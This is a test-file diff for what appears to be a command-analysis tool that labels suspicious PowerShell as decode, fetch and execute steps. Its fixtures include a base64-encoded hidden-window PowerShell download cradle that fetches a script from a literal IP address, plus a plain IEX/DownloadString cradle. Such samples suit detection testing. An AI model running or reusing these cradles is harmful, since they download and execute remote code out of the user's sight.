@@ -154,3 +154,28 @@ describe('copyText — decoded script + base specificity (quick wins)', () => {
     expect(r.copyText).not.toContain('[near-dispositive] download cradle')
   })
 })
+
+describe('analyze — bullets wiring (Phase 4)', () => {
+  const encCradle =
+    'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
+
+  it('a -enc download cradle yields decode → fetch → execute bullets, in that order', async () => {
+    const r = await analyze('powershell -nop -w hidden -enc ' + encCradle)
+    expect(r.bullets.length).toBeGreaterThanOrEqual(3)
+    expect(r.bullets[0].text).toContain('Base64 `-EncodedCommand`')
+    expect(r.bullets.some((b) => b.text.includes('Downloads content from'))).toBe(true)
+    expect(r.bullets.some((b) => b.text.includes('Executes the downloaded content in memory'))).toBe(true)
+  })
+
+  it('copyText includes a "What it did" section listing the confident bullets', async () => {
+    const r = await analyze('powershell -nop -w hidden -enc ' + encCradle)
+    expect(r.copyText).toContain('What it did:')
+    expect(r.copyText).toContain('Downloads content from')
+  })
+
+  it('an unresolved fetch target degrades the Downloads bullet to inferred confidence', async () => {
+    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString($u)")
+    const b = r.bullets.find((x) => x.verb === 'Downloads')
+    expect(b!.confidence).toBe('inferred')
+  })
+})
